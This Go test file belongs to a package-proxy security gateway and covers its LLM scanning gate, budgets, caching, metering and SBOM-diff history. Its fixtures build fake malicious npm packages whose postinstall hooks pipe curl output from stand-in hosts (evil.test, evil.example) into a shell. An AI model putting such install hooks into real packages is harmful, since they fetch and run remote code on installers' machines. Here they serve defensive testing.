package proxy

// Regression tests for defects an independent review of the full scan's
// gateway side found (Task 192): each scenario failed on the first version.

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/blechschmidt/pullthrough-security/internal/installhooks"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan"
	"github.com/blechschmidt/pullthrough-security/internal/llmpkgscan/pkgscantest"
	"github.com/blechschmidt/pullthrough-security/internal/policy"
	"github.com/blechschmidt/pullthrough-security/internal/sbomdiff"
	"github.com/blechschmidt/pullthrough-security/internal/scan/commit"
)

// gatelessPull pulls a path through a gateway that shares fx's cache and
// backends but has no LLM gate: what a client pulled before the gate existed.
func gatelessPull(t *testing.T, fx *llmGateFixture, path string) {
	t.Helper()
	deps := fx.g.deps
	deps.LLMPkgScan = nil
	before, err := New(deps, Options{HTTPAddr: ":0"})
	if err != nil {
		t.Fatal(err)
	}
	rr := httptest.NewRecorder()
	before.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, path, nil))
	if rr.Code != http.StatusOK {
		t.Fatalf("gate-less pull of %s: %d", path, rr.Code)
	}
}

func evilTwo() []byte {
	return pkgscantest.NpmTarball("evil-two", "1.0.0",
		map[string]string{"postinstall": "node x.js"},
		map[string]string{"x.js": "require('child_process').exec('curl https://evil.test | sh') // " + pkgscantest.MaliciousMarker + "\n"})
}

const evilTwoPath = "/v1/npm/evil-two/-/evil-two-1.0.0.tgz"

// The full scan's scans are paid from its own budget (OwnBudget): a backfill
// that spends more than the gate's tenant ceiling leaves the clients' pulls
// with the gate's budget intact — a new malicious artifact is still refused.
func TestOwnBudgetLeavesTheGateBudgetToClients(t *testing.T) {
	p := &pkgscantest.Provider{Usage: commit.Usage{InputTokens: 2_000_000, OutputTokens: 1000}}
	fx := newLLMGateFixture(t, llmEvilTarball(), p, func(c *llmpkgscan.Config) {
		c.Budget = llmpkgscan.BudgetConfig{Enabled: true, TenantCeilingUSD: 1, GlobalCeilingUSD: 1}
	}, nil)
	gatelessPull(t, fx, llmEvilPath) // cached before the gate existed
	sl, err := fx.g.SystemScan(context.Background(), SystemScanRequest{
		Backend: "npm", Path: evilBackendPath, Subject: "system:full-scan", OwnBudget: true,
	})
	if err != nil || sl.Report == nil || !sl.Report.Scanned() || sl.Report.SpentUSD <= 1 {
		t.Fatalf("backfill scan: %+v %v", sl, err)
	}
	if b := fx.svc.BudgetStatus(); b.GlobalSpentUSD != 0 || b.GlobalExhausted {
		t.Fatalf("the full scan's scan was charged to the gate's budget: %+v", b)
	}
	fx.payload.Store(evilTwo())
	rr := fx.pull(evilTwoPath)
	if rr.Code != http.StatusForbidden || rr.Header().Get("X-LLMPkgScan-Verdict") != string(llmpkgscan.DispositionMalicious) {
		t.Fatalf("a client's pull of a new malicious artifact: %d, code %q, verdict %q",
			rr.Code, rr.Header().Get("X-LLMPkgScan-Code"), rr.Header().Get("X-LLMPkgScan-Verdict"))
	}
}

// A gate pass never fetches: not on a non-cacheable path either.
func TestCacheOnlyNeverFetches(t *testing.T) {
	fx := newLLMGateFixture(t, llmBenignTarball(), &pkgscantest.Provider{}, nil, nil)
	var body bytes.Buffer
	hits := atomic.LoadInt32(fx.hits)
	res, err := fx.g.SystemFetch(context.Background(), SystemFetchRequest{
		Backend: "npm", Path: "/left-pad", Tenant: "team-a", CacheOnly: true, NoReview: true,
	}, &body)
	if err != nil || res.Status != http.StatusNotFound || res.Admitted || atomic.LoadInt32(fx.hits) != hits || body.Len() != 0 {
		t.Fatalf("a gate pass over a non-cacheable path: %+v %v (%d upstream hits, %d bytes)", res, err, atomic.LoadInt32(fx.hits)-hits, body.Len())
	}
}

type meterRec struct {
	mu       sync.Mutex
	requests []string
}

func (m *meterRec) RecordRequest(tenant, backend, eco string) {
	m.mu.Lock()
	m.requests = append(m.requests, tenant+"|"+backend)
	m.mu.Unlock()
}
func (m *meterRec) RecordTraffic(string, int64, bool) {}
func (m *meterRec) RecordStorage(string, int64)       {}
func (m *meterRec) RecordScan(string, string)         {}
func (m *meterRec) RecordBlock(string, string)        {}

// A gate pass is nobody's request: it is not metered.
func TestGatePassIsNotMetered(t *testing.T) {
	m := &meterRec{}
	fx := newLLMGateFixture(t, llmBenignTarball(), &pkgscantest.Provider{}, nil, func(d *Dependencies) { d.Metering = m })
	gatelessPull(t, fx, llmBenignPath)
	m.mu.Lock()
	m.requests = nil
	m.mu.Unlock()
	res, err := fx.g.SystemFetch(context.Background(), SystemFetchRequest{
		Backend: "npm", Path: strings.TrimPrefix(llmBenignPath, "/v1/npm"), Tenant: "team-a", Subject: "system:full-scan", CacheOnly: true, NoReview: true,
	}, nil)
	if err != nil || !res.Admitted {
		t.Fatalf("gate pass: %+v %v", res, err)
	}
	m.mu.Lock()
	defer m.mu.Unlock()
	if len(m.requests) != 0 {
		t.Fatalf("the gate pass was metered: %v", m.requests)
	}
}

// The ladder evicts only the bytes it judged: a clean object that replaced
// them under the same key meanwhile stays.
func TestEnforceSparesBytesThatReplacedTheJudgedOnes(t *testing.T) {
	fx := newLLMGateFixture(t, llmEvilTarball(), &pkgscantest.Provider{}, nil, nil)
	gatelessPull(t, fx, llmEvilPath)
	sl, err := fx.g.SystemScan(context.Background(), SystemScanRequest{Backend: "npm", Path: evilBackendPath, Subject: "system:full-scan"})
	if err != nil || sl.Decision.Served() {
		t.Fatalf("scan: %+v %v", sl, err)
	}
	if err := fx.cache.Delete(context.Background(), sl.CacheKey); err != nil {
		t.Fatal(err)
	}
	fx.payload.Store(llmBenignTarball())
	gatelessPull(t, fx, llmEvilPath)
	enf, err := fx.g.EnforceLLMScan(context.Background(), SystemEnforceRequest{Backend: "npm", Path: evilBackendPath, Scan: sl, Source: "full-scan"})
	if err != nil || enf.Evicted {
		t.Fatalf("enforce: %+v %v", enf, err)
	}
	if _, err := fx.cache.Stat(context.Background(), sl.CacheKey); err != nil {
		t.Fatalf("the clean replacement was evicted: %v", err)
	}
}

// A gate pass leaves the sbom-diff gate's history alone, in both directions:
// an old version re-checked does not become the baseline a new one is diffed
// against, and a drifting version re-checked does not hide the next drift.
func TestGatePassLeavesTheSbomDiffHistoryAlone(t *testing.T) {
	evilDeps := map[string]string{"@x/a": "1.0.0", "@x/b": "1.0.0", "@x/c": "1.0.0", "@x/d": "1.0.0", "@x/e": "1.0.0"}
	v1 := npmTarballWithDeps("demo", "1.0.0", map[string]string{})
	v2 := npmTarballWithDeps("demo", "2.0.0", evilDeps)
	v3 := npmTarballWithDeps("demo", "3.0.0", evilDeps)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "1.0.0"):
			_, _ = w.Write(v1)
		case strings.Contains(r.URL.Path, "2.0.0"):
			_, _ = w.Write(v2)
		default:
			_, _ = w.Write(v3)
		}
	}))
	defer srv.Close()
	handlerURL = srv.URL
	run := func(t *testing.T, gatePassOver string, firstWithGate, cachedBefore string) int {
		svc := sbomdiff.NewService(sbomdiff.Config{Enabled: true, Action: policy.ActionBlock, WarnThreshold: 10, BlockThreshold: 20, SignificantThreshold: 15}, nil)
		g := newSbomDiffGateway(t, svc)
		deps := g.deps
		deps.SbomDiff = nil
		before, err := New(deps, Options{HTTPAddr: ":0"})
		if err != nil {
			t.Fatal(err)
		}
		pull := func(gw *Gateway, v string) int {
			rr := httptest.NewRecorder()
			gw.routes().ServeHTTP(rr, httptest.NewRequest(http.MethodGet, "/v1/npm/demo/-/demo-"+v+".tgz", nil))
			return rr.Code
		}
		if c := pull(before, cachedBefore); c != 200 {
			t.Fatalf("%s before the gate: %d", cachedBefore, c)
		}
		if c := pull(g, firstWithGate); c != 200 {
			t.Fatalf("%s: %d", firstWithGate, c)
		}
		if gatePassOver != "" {
			res, err := g.SystemFetch(context.Background(), SystemFetchRequest{Backend: "npm", Path: "/demo/-/demo-" + gatePassOver + ".tgz", Subject: "system:full-scan", CacheOnly: true, NoReview: true}, nil)
			if err != nil || !res.Admitted {
				t.Fatalf("gate pass over %s: %+v %v", gatePassOver, res, err)
			}
		}
		return pull(g, "3.0.0")
	}
	// v1 cached before the gate, v2 the baseline: v3 has v2's dependencies.
	if without, with := run(t, "", "2.0.0", "1.0.0"), run(t, "1.0.0", "2.0.0", "1.0.0"); without != 200 || with != without {
		t.Fatalf("v3 after a gate pass over the old v1: %d (without the pass: %d)", with, without)
	}
	// v1 the baseline, the drifting v2 cached before: v3 drifts from v1.
	if without, with := run(t, "", "1.0.0", "2.0.0"), run(t, "2.0.0", "1.0.0", "2.0.0"); without != http.StatusForbidden || with != without {
		t.Fatalf("the drifting v3 after a gate pass over v2: %d (without the pass: %d)", with, without)
	}
}

// The path a cache fill records is the escaped one: a system scan and a gate
// pass both decode it as the serve pipeline does, so a literal "%" in a name
// survives the round trip.
func TestRecordedPathsRoundTrip(t *testing.T) {
	fx := newLLMGateFixture(t, llmBenignTarball(), &pkgscantest.Provider{}, nil, nil)
	gatelessPull(t, fx, "/v1/npm/a%2520b/-/a%2520b-1.0.0.tgz")
	entries, _ := fx.cache.Entries(context.Background())
	if len(entries) != 1 {
		t.Fatalf("entries %d", len(entries))
	}
	key, fillPath := entries[0].Key, entries[0].Metadata["fill-path"]
	sl, err := fx.g.SystemScan(context.Background(), SystemScanRequest{Backend: "npm", Path: fillPath, CacheKey: key, Subject: "system:full-scan"})
	if err != nil || sl == nil || !sl.Applicable {
		t.Fatalf("a system scan of the recorded path %q: %+v %v", fillPath, sl, err)
	}
	res, err := fx.g.SystemFetch(context.Background(), SystemFetchRequest{Backend: "npm", Path: fillPath, Subject: "system:full-scan", CacheOnly: true, NoReview: true}, nil)
	if err != nil || res.Status != http.StatusNoContent || !res.Admitted || res.CacheKey != key {
		t.Fatalf("a gate pass over the recorded path %q: %+v %v", fillPath, res, err)
	}
}

// The full scan's findings merge into the document a client's pull recorded:
// the other gates' findings stay.
func TestSystemFindingsMergeIntoThePullsDocument(t *testing.T) {
	ih, err := installhooks.NewService(installhooks.Config{Enabled: true, FailSeverity: installhooks.SeverityCritical, WarnSeverity: installhooks.SeverityLow, Action: installhooks.ActionWarn})
	if err != nil {
		t.Fatal(err)
	}
	evil := pkgscantest.NpmTarball("evil-pad", "1.0.0",
		map[string]string{"postinstall": "curl -s http://evil.example/x | bash"},
		map[string]string{"index.js": "module.exports = 1 // " + pkgscantest.MaliciousMarker + "\n"})
	fx := newLLMGateFixture(t, evil, &pkgscantest.Provider{},
		func(c *llmpkgscan.Config) { c.Action = llmpkgscan.ActionAnnotate },
		func(d *Dependencies) { d.InstallHooks = ih })
	if rr := fx.pull(llmEvilPath); rr.Code != http.StatusOK {
		t.Fatalf("client pull: %d", rr.Code)
	}
	gates := func() map[string]int {
		doc, ok := fx.findings.Get("", "evil-pad")
		out := map[string]int{}
		if !ok {
			return out
		}
		for _, f := range doc.Findings {
			out[string(f.Gate)]++
		}
		return out
	}
	before := gates()
	if before["installhooks"] == 0 || before["llmpkgscan"] == 0 {
		t.Fatalf("the pull's document: %v", before)
	}
	sl, err := fx.g.SystemScan(context.Background(), SystemScanRequest{Backend: "npm", Path: evilBackendPath, Subject: "system:full-scan"})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := fx.g.EnforceLLMScan(context.Background(), SystemEnforceRequest{Backend: "npm", Path: evilBackendPath, Scan: sl, RecordFindings: true, Source: "full-scan", Subject: "system:full-scan"}); err != nil {
		t.Fatal(err)
	}
	if after := gates(); after["installhooks"] != before["installhooks"] || after["llmpkgscan"] != before["llmpkgscan"] {
		t.Fatalf("findings by gate before %v, after the full scan's reading %v", before, after)
	}
}
